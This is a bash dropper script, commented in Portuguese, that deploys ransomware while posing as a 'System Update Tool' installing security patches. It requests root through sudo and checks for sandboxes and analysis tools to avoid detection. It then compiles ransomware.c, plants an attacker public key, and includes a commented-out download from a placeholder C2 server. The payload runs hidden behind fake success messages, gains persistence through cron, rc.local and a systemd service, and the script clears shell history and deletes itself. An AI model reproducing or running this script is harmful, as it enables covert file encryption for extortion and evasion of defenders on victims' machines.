#!/bin/bash

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuração
PAYLOAD_NAME="update_system"
PAYLOAD_PATH="/tmp/${PAYLOAD_NAME}"
PUBLIC_KEY_PATH="/tmp/publica.pem"
PERSISTENCE_SCRIPT="/etc/cron.hourly/system_update"

# Banner de "falso serviço"
echo -e "${GREEN}[*] System Update Tool v2.1${NC}"
echo -e "${YELLOW}[!] Installing critical security patches...${NC}"

# 1. Verificar se é root
check_root() {
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[-] This tool requires root privileges${NC}"
        echo -e "${YELLOW}[!] Attempting sudo...${NC}"
        exec sudo "$0" "$@"
        exit 1
    fi
}

# 2. Anti-sandbox básico (evitar análise)
check_sandbox() {
    # Verificar processos comuns de análise
    local sandbox_procs=("wireshark" "tcpdump" "strace" "gdb" "vbox" "vmware")
    
    for proc in "${sandbox_procs[@]}"; do
        if pgrep -x "$proc" > /dev/null; then
            echo -e "${RED}[-] Incompatible environment detected${NC}"
            exit 1
        fi
    done
    
    # Verificar tempo de atividade (muito baixo = VM recém iniciada)
    uptime_seconds=$(awk '{print int($1)}' /proc/uptime)
    if [ "$uptime_seconds" -lt 300 ]; then
        echo -e "${YELLOW}[!] System recently booted, delaying execution...${NC}"
        sleep 60
    fi
}

# 3. Instalar dependências silenciosamente
install_deps() {
    echo -e "${GREEN}[*] Checking dependencies...${NC}"
    
    # Verifica OpenSSL
    if ! command -v openssl &> /dev/null; then
        apt-get update -qq 2>/dev/null || yum update -q 2>/dev/null
        apt-get install -y -qq libssl-dev curl 2>/dev/null || \
        yum install -y -q openssl-devel curl 2>/dev/null
    fi
    
    # Verifica libcurl
    if ! ldconfig -p | grep -q libcurl; then
        apt-get install -y -qq libcurl4-openssl-dev 2>/dev/null
    fi
}

# 4. Compilar payload (se for source)
compile_payload() {
    echo -e "${GREEN}[*] Compiling payload...${NC}"
    
    gcc -o "$PAYLOAD_PATH" ransomware.c \
        -lssl -lcrypto -lcurl \
        -O2 -s -static-libgcc \
        -Wl,--strip-all  # Remove símbolos de debug
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}[-] Compilation failed${NC}"
        exit 1
    fi
    
    # Obfuscação básica de strings
    strip "$PAYLOAD_PATH"
    echo -e "${GREEN}[+] Payload compiled successfully${NC}"
}

# 5. Exfiltração da chave pública (embedded ou download)
deploy_public_key() {
    echo -e "${GREEN}[*] Deploying update certificates...${NC}"
    
    # Opção 1: Extrair de base64 embedado
    cat > "$PUBLIC_KEY_PATH" << 'EOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
(sua chave pública aqui)
-----END PUBLIC KEY-----
EOF
    
    # Opção 2: Download de servidor C2 (mais modular)
    # curl -s "http://seu-server.com/key.pem" -o "$PUBLIC_KEY_PATH"
    
    chmod 644 "$PUBLIC_KEY_PATH"
}

# 6. Executar payload com argumentos
execute_payload() {
    echo -e "${GREEN}[*] Installing security patches...${NC}"
    
    # Executa em background com nohup
    nohup "$PAYLOAD_PATH" > /dev/null 2>&1 &
    PAYLOAD_PID=$!
    
    sleep 2
    if kill -0 $PAYLOAD_PID 2>/dev/null; then
        echo -e "${GREEN}[+] Patches installed successfully (PID: $PAYLOAD_PID)${NC}"
    else
        echo -e "${RED}[-] Installation failed${NC}"
        exit 1
    fi
}

# 7. Limpeza de vestígios (opcional)
cleanup_traces() {
    echo -e "${YELLOW}[!] Cleaning installation files...${NC}"
    
    # Limpa histórico de comandos
    history -c 2>/dev/null
    rm -f ~/.bash_history 2>/dev/null
    
    # Remove logs do compilador
    rm -rf /tmp/gcc* 2>/dev/null
    
    # Remove o próprio script se executado de local suspeito
    if [[ "$0" != "/tmp/"* ]]; then
        rm -f "$0" 2>/dev/null
    fi
}

# 8. Persistência (script separado)
setup_persistence() {
    local persist_script="/tmp/persistence.sh"
    
    cat > "$persist_script" << 'SCRIPT'
#!/bin/bash
# Persistence module - runs every hour
PAYLOAD="/tmp/update_system"

if [ -f "$PAYLOAD" ] && ! pgrep -f "$PAYLOAD" > /dev/null; then
    "$PAYLOAD" > /dev/null 2>&1 &
fi
SCRIPT
    
    chmod +x "$persist_script"
    
    # Múltiplos métodos de persistência
    if [ -d "/etc/cron.hourly" ]; then
        cp "$persist_script" "/etc/cron.hourly/system_update"
    fi
    
    if [ -f "/etc/rc.local" ]; then
        sed -i '/exit 0/d' /etc/rc.local
        echo "$persist_script &" >> /etc/rc.local
        echo "exit 0" >> /etc/rc.local
    fi
    
    # Systemd service (mais moderno)
    cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=$persist_script
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload 2>/dev/null
    systemctl enable system-update.service 2>/dev/null
    
    rm -f "$persist_script"
}

# MAIN EXECUTION
main() {
    check_root
    check_sandbox
    install_deps
    deploy_public_key
    compile_payload
    execute_payload
    
    # Decide se instala persistência (argumento)
    if [ "$1" == "--persist" ]; then
        setup_persistence
        echo -e "${GREEN}[+] Persistence installed${NC}"
    fi
    
    cleanup_traces
    echo -e "${GREEN}[+] System is up to date!${NC}"
}

# Chama main com argumentos
main "$@"